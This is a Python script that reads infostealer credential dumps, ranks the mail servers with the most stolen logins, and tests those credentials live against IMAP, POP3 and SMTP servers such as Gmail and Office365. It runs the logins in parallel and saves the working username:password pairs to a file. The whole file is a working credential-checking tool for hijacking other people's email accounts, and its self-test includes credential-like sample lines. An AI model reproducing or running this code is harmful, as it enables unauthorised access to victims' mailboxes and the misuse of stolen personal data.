#!/usr/bin/env python3
"""
check_top_mail_servers.py — rank mail-server credentials by volume across the
0802/0803 classified dumps, then live-check the top-N servers' credentials
(IMAP / POP3 / SMTP login) without echoing passwords.

Line format handled (colon separated, from stealer-classified dumps):
    imap.gmail.com:user@gmail.com:password
    smtp.office365.com:587:user@domain.com:password
    mailbox.org:user:password

Usage:
    python3 check_top_mail_servers.py --list-top          # rank only, no network
    python3 check_top_mail_servers.py --top 20             # check top 20 servers
    python3 check_top_mail_servers.py --top 5 --max-per-host 10 --out valid.txt

Options:
    --dirs DIR[,DIR...]   classified dirs (default: 0802_downloads + 0803)
    --top N               servers ranked by credential volume (default 20)
    --max-per-host N      check at most N creds per server (default 30, 0=all)
    --concurrency N       parallel checks (default 8)
    --delay S             seconds between attempts per server (default 0.2)
    --timeout S           socket timeout (default 15)
    --out FILE            write VALID server:user:pass lines here
    --list-top            only print the volume ranking and exit
"""

import argparse
import imaplib
import os
import poplib
import re
import smtplib
import subprocess
import sys
import time
from collections import Counter, OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed

# mail-server host tokens (host field in dump lines)
MAILHOST_RE = re.compile(
    r"^(?P<host>(?:imap|imaps|secureimap|pop|pop3|securepop|smtp|smtps|mailbox|outlook|mx|mail|mail2)\."
    r"[a-z0-9](?:[a-z0-9-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)*(?:\.[a-z]{2,}))$",
    re.IGNORECASE,
)
PLAIN_MAILHOSTS = {"mailbox.org", "mailbox.club", "mailbox.hu", "mail.com", "gmail.com"}
PORT_RE = re.compile(r"^(993|995|110|143|465|587|25)$")
EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")

DEFAULT_DIRS = [
    "/Volumes/Untitled/cookies/data/0802_downloads/classified",
    "/Volumes/Untitled/cookies/data/0803/classified",
]


def iter_lines(dirs, host_regex, rg_bin="rg"):
    """Stream candidate lines from the classified dirs using ripgrep (fast on multi-GB dumps)."""
    cmd = [rg_bin, "-S", "-i", "--no-filename", "--glob", "*.txt", "-e", host_regex] + list(dirs)
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True, errors="ignore")
    for line in proc.stdout:
        yield line
    proc.stdout.close()
    proc.wait()


def is_mailhost(tok):
    t = tok.strip().strip(".").lower()
    return bool(MAILHOST_RE.match(t)) or t in PLAIN_MAILHOSTS


def imap_host_of(tok):
    """Normalize a plain/webmail host to its IMAP-style endpoint for login tests."""
    t = tok.lower()
    WEBMAIL_IMAP = {
        "mail.google.com": "imap.gmail.com",
        "mail.googlemail.com": "imap.gmail.com",
        "mail.com": "imap.mail.com",
        "mail.yahoo.com": "imap.mail.yahoo.com",
        "mail.bellsouth.net": "imap.att.net",
    }
    if t in WEBMAIL_IMAP:
        return WEBMAIL_IMAP[t]
    if t in PLAIN_MAILHOSTS and not t.startswith(("imap.", "pop", "smtp.")):
        return f"imap.{t}"
    return t


def parse_line(line):
    """Return dict(host, port, user, password, protocol) or None."""
    parts = line.rstrip("\r\n").split(":")
    if len(parts) < 3:
        return None
    # locate the mail-server host token
    host_i = next((i for i, p in enumerate(parts) if is_mailhost(p)), None)
    if host_i is None:
        return None
    host = parts[host_i].strip().lower()
    rest = parts[host_i + 1 :]
    if not rest:
        return None
    port = None
    if rest and PORT_RE.match(rest[0].strip()):
        port = int(rest.pop(0))
    if not rest:
        return None
    user = rest[0].strip()
    password = rest[1].strip() if len(rest) > 1 else ""
    if not user or not password or user == password:
        return None
    if host.startswith("smtp"):
        protocol, defport = "smtp", 587
    elif host.startswith(("pop", "securepop")):
        protocol, defport = "pop3", 995
    else:
        protocol, defport = "imap", 993
    return {"host": host, "port": port or defport, "user": user, "password": password, "protocol": protocol}


def collect(dirs):
    """Parse all candidate lines → (host, cred dict) list + volume counter."""
    regex = r"(?:^|:)(?:imap|imaps|secureimap|pop|pop3|securepop|smtp|smtps|mailbox|outlook|mx|mail|mail2)\.[a-z0-9]"
    creds_by_host = OrderedDict()
    volumes = Counter()
    for line in iter_lines(dirs, regex):
        c = parse_line(line)
        if not c:
            continue
        volumes[c["host"]] += 1
        creds_by_host.setdefault(c["host"], []).append(c)
    return creds_by_host, volumes


# ---- checks (stdlib) ----

def check_imap(host, port, user, password, timeout):
    with imaplib.IMAP4_SSL(host, port, timeout=timeout) as c:
        c.login(user, password)
    return True


def check_pop3(host, port, user, password, timeout):
    c = poplib.POP3_SSL(host, port, timeout=timeout)
    try:
        c.user(user)
        c.pass_(password)
    finally:
        c.quit()
    return True


def check_smtp(host, port, user, password, timeout):
    with smtplib.SMTP(host, port, timeout=timeout) as c:
        c.ehlo()
        if port == 465:
            c.starttls()  # noqa: S701  (465 is already implicit-TLS; starttls is a no-op safe fallback)
        else:
            c.starttls()
        c.ehlo()
        c.login(user, password)
    return True


CHECKERS = {"imap": check_imap, "pop3": check_pop3, "smtp": check_smtp}


def selftest():
    cases = [
        ("imap.gmail.com:user@gmail.com:pass123", "imap", "imap.gmail.com", "user@gmail.com"),
        ("smtp.office365.com:587:akasay@x.com:Aky0143", "smtp", "smtp.office365.com", "akasay@x.com"),
        ("pop.gmail.com:995:u@gmail.com:pw", "pop3", "pop.gmail.com", "u@gmail.com"),
        ("mailbox.org:user:pw", "imap", "mailbox.org", "user"),
        ("imap.gmail.com:user@gmail.com", None, None, None),          # no password
        ("random.site.com:user:pass", None, None, None),               # no mail host
        ("com.vivo.email/:imap.gmail.com:dhc2019040147", None, None, None),   # android app line, no password
        ("yaso2001.baek1992:imap.gmail.com:totya200193@gmail.com", None, None, None),  # no password field
    ]
    for line, proto, host, user in cases:
        c = parse_line(line)
        got = (c["protocol"], c["host"], c["user"]) if c else (None, None, None)
        want = (proto, host, user)
        if got != want:
            sys.exit(f"SELFTEST FAIL: {line!r} → {got} != {want}")
    if imap_host_of("mailbox.org") != "imap.mailbox.org" or imap_host_of("mail.google.com") != "imap.gmail.com":
        sys.exit("SELFTEST FAIL: imap_host_of")
    print(f"SELFTEST PASS ({len(cases)} parse cases)")
    sys.exit(0)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--dirs", default=",".join(DEFAULT_DIRS))
    ap.add_argument("--top", type=int, default=20)
    ap.add_argument("--max-per-host", type=int, default=30)
    ap.add_argument("--concurrency", type=int, default=8)
    ap.add_argument("--delay", type=float, default=0.2)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--out")
    ap.add_argument("--list-top", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()

    if args.selftest:
        selftest()

    dirs = [d for d in args.dirs.split(",") if os.path.isdir(d)]
    if not dirs:
        sys.exit("no valid --dirs")

    creds_by_host, volumes = collect(dirs)
    top = volumes.most_common(args.top)
    print(f"parsed {sum(volumes.values())} mail-server cred lines, {len(volumes)} distinct hosts")
    print(f"top {len(top)} servers by volume:")
    for host, n in top:
        print(f"  {n:>8}  {host}")

    if args.list_top:
        return

    checked, valid_lines = 0, []
    for host, _ in top:
        creds = creds_by_host[host][: args.max_per_host] if args.max_per_host else creds_by_host[host]
        h = imap_host_of(host)
        print(f"\n== {host}  ({len(creds)} creds checked of {volumes[host]})")

        def run(c):
            fn = CHECKERS.get(c["protocol"])
            if fn is None:
                return c, False, "unknown-protocol"
            try:
                fn(h, c["port"], c["user"], c["password"], args.timeout)
                return c, True, "ok"
            except (imaplib.IMAP4.error, poplib.error_proto, smtplib.SMTPAuthenticationError) as e:
                return c, False, f"auth: {e}"
            except (OSError, smtplib.SMTPException) as e:
                return c, False, f"net: {type(e).__name__}"

        with ThreadPoolExecutor(max_workers=args.concurrency) as ex:
            futs = [ex.submit(run, c) for c in creds]
            for i, f in enumerate(as_completed(futs)):
                c, ok, msg = f.result()
                checked += 1
                kind = msg.split(":", 1)[0].split(" ", 1)[0]
                print(f"    {'VALID' if ok else 'FAIL':5} [{c['protocol']}] {c['user']} @ {host}  ({kind})")
                if ok:
                    valid_lines.append(f"{host}:{c['user']}:{c['password']}")
                time.sleep(args.delay)

    print(f"\nchecked {checked} creds, {len(valid_lines)} VALID")
    if args.out and valid_lines:
        with open(args.out, "w", encoding="utf-8") as f:
            f.write("\n".join(valid_lines) + "\n")
        print(f"valid creds → {args.out}")


if __name__ == "__main__":
    main()
